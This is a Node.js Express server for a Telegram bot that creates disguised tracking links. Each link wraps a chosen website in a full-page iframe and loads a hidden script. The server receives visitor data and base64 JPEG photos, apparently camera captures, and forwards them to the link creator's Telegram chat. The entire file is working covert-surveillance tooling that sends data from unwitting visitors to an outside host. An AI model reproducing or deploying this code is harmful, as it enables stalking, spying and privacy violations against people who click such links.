import express from "express";
import fetch from "node-fetch";
import fs from "fs";
import FormData from "form-data";

const app = express();
app.use(express.json());
app.use(express.static("public"));

const BOT_TOKEN = "YOUR_BOT_TOKEN";
const ADMIN_ID = 123456789; // apna ID daal

const DB_FILE = "./database.json";

// DB
function loadDB() {
  if (!fs.existsSync(DB_FILE)) {
    fs.writeFileSync(DB_FILE, "{}");
  }
  return JSON.parse(fs.readFileSync(DB_FILE));
}

function saveDB(data) {
  fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

function generateId() {
  return Math.random().toString(36).substring(2, 8);
}

// HOME
app.get("/", (req, res) => {
  res.send("Bot Running 🚀");
});

// TRACK LINK
app.get("/t/:id", (req, res) => {
  const db = loadDB();
  const entry = db[req.params.id];

  if (!entry) return res.send("Invalid ID");

  res.send(`
  <iframe src="${entry.url}" style="width:100%;height:100%;border:none;"></iframe>
  <script 
    data-id="${req.params.id}" 
    data-url="https://YOUR-RENDER-URL"
    src="/script.js"></script>
  `);
});

// RECEIVE DATA
app.post("/data", async (req, res) => {
  const { trackingId, data } = req.body;

  const db = loadDB();
  const entry = db[trackingId];

  if (!entry) return res.sendStatus(404);

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      chat_id: entry.owner,
      text: "📡 New Visitor\n\n" + JSON.stringify(data, null, 2)
    })
  });

  res.sendStatus(200);
});

// PHOTO
app.post("/photo", async (req, res) => {
  const { imageData, trackingId } = req.body;

  const db = loadDB();
  const entry = db[trackingId];

  if (!entry) return res.sendStatus(404);

  const base64 = imageData.replace(/^data:image\/jpeg;base64,/, "");
  const file = `photo_${Date.now()}.jpg`;

  fs.writeFileSync(file, base64, "base64");

  const form = new FormData();
  form.append("chat_id", entry.owner);
  form.append("photo", fs.createReadStream(file));

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: form
  });

  fs.unlinkSync(file);
  res.sendStatus(200);
});

// TELEGRAM WEBHOOK
app.post(`/bot${BOT_TOKEN}`, async (req, res) => {
  const msg = req.body.message;
  if (!msg) return res.sendStatus(200);

  const chatId = msg.chat.id;
  const text = msg.text || "";
  const db = loadDB();

  // START
  if (text === "/start") {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        chat_id: chatId,
        text: "👋 Welcome\n\nUse /create to make link"
      })
    });
  }

  // CREATE
  else if (text === "/create") {
    db[chatId] = { waiting: true };
    saveDB(db);

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        chat_id: chatId,
        text: "Send URL"
      })
    });
  }

  // URL INPUT
  else if (db[chatId]?.waiting) {
    const id = generateId();

    db[id] = {
      owner: chatId,
      url: text
    };

    db[chatId].waiting = false;
    saveDB(db);

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        chat_id: chatId,
        text: `✅ Link:\nhttps://YOUR-RENDER-URL/t/${id}`
      })
    });
  }

  res.sendStatus(200);
});

// START
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Server Running 🚀"));